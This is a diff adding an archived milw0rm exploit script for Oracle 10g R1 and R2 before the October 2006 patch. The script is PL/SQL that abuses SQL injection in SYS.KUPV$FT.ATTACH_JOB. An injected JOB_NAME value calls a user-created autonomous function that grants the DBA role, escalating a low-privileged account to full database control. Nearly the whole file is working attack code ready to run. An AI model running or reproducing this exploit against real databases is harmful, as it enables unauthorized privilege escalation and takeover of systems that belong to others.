@@ -1,0 +1,42 @@
+/**
+* Exploit for Oracle10g R1 and R2 prior to CPU Oct 2006
+* Joxean Koret <joxeankoret@yahoo.es>
+* Privileges needed:
+*
+* - EXECUTE_CATALOG_ROLE
+* - CREATE PROCEDURE
+*
+*/
+select *
+from user_role_privs
+;
+
+CREATE OR REPLACE FUNCTION F1
+RETURN NUMBER AUTHID CURRENT_USER
+IS
+PRAGMA AUTONOMOUS_TRANSACTION;
+BEGIN
+EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
+COMMIT;
+RETURN(1);
+END;
+/
+
+DECLARE
+USER_NAME VARCHAR2(200);
+JOB_NAME VARCHAR2(200);
+NEW_JOB BOOLEAN;
+v_Return NUMBER;
+BEGIN
+USER_NAME := 'OWNER';
+JOB_NAME := ''' OR ' || USER || '.f1() = 1--';
+
+v_Return := SYS.KUPV$FT.ATTACH_JOB(
+USER_NAME => USER_NAME,
+JOB_NAME => JOB_NAME,
+NEW_JOB => NEW_JOB
+);
+END;
+/
+
+// milw0rm.com [2007-01-23]
